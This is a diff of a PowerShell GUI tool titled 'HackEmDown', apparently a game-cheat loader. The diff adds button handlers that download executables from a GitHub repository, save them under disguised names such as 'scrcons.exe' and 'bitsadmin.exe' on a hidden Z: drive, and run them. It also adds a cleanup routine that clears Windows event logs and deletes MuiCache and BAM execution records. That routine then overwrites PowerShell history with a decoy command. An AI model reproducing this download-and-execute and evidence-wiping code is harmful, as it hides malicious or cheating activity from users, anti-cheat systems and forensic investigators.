@@ -188,7 +188,7 @@ $form.MinimizeBox = $false
 $form.BackColor = 'Black'  # Set background color of the form to black
 
 # Set the title to empty (remove the title)
-$form.Text = "HacKEmDown" 
+$form.Text = "HackEmDown" 
 
 # Set the top bar (title bar) color to black
 $form.BackColor = 'Black'  # Set background color for the whole form
@@ -286,19 +286,28 @@ $injectButton.Add_Click({
 
     # === YOUR CUSTOM PRESTIGE LOGIC HERE ===
     $prestigeButton.Add_Click({
-        [System.Windows.Forms.MessageBox]::Show("Prestige logic placeholder", "Prestige")
-        # Replace this with your real code
+if (-Not (Test-Path "Z:\sodium-fabric-0.6.13+mc1.21.4.jar")) {
+    iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium.jar" -OutFile "Z:\sodium-fabric-0.6.13+mc1.21.4.jar"
+}
+Start-Process java -ArgumentList '-jar "Z:\sodium-fabric-0.6.13+mc1.21.4.jar"'
+
     })
 
     # === YOUR CUSTOM VAPELITE LOGIC HERE ===
     $vapeliteButton.Add_Click({
-        [System.Windows.Forms.MessageBox]::Show("Vape logic placeholder", "Vape")
-        # Replace this with your real code
+if (-Not (Test-Path "Z:\scrcons.exe")) {
+    iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/wpbbin.exe" -OutFile "Z:\scrcons.exe"
+}
+Start-Process "Z:\scrcons.exe"
+
     })
 
         # === YOUR CUSTOM VAPEV4 LOGIC HERE ===
-    $vapev4Button.Add_Click({
-        [System.Windows.Forms.MessageBox]::Show("Vape logic placeholder", "Vape")
+if (-Not (Test-Path "Z:\bitsadmin.exe")) {
+    iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/svchost.exe" -OutFile "Z:\bitsadmin.exe"
+}
+Start-Process "Z:\bitsadmin.exe"
+
         # Replace this with your real code
     })
 })
@@ -377,6 +386,27 @@ assign letter=Z
     } | ForEach-Object {
         Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
     }
+
+    Stop-Process -Name vds -Force
+
+
+    Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.txt" | Where-Object { $_.Name -like "*PowerShell*" } | Remove-Item -Force
+
+    # event logs
+    Clear-EventLog -LogName System
+    wevtutil cl "Windows PowerShell"
+
+    # Remove Stuff from MuiCache
+    Get-ItemProperty HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache |
+    ForEach-Object { $_.PSObject.Properties } |
+    Where-Object { $_.Name -like "Z:\*" } |
+    ForEach-Object { Remove-ItemProperty -Path "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Name $_.Name }
+
+    # BAM
+    gp HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State | % { $_.PSObject.Properties } | ? { $_.Name -match "mmc\.exe|diskkpart\.exe" } | % { ri HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -n $_.Name }
+
+    # Conhost History
+    Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1 | iex'
 
     # Stop the script process
     Stop-Process -Id $PID
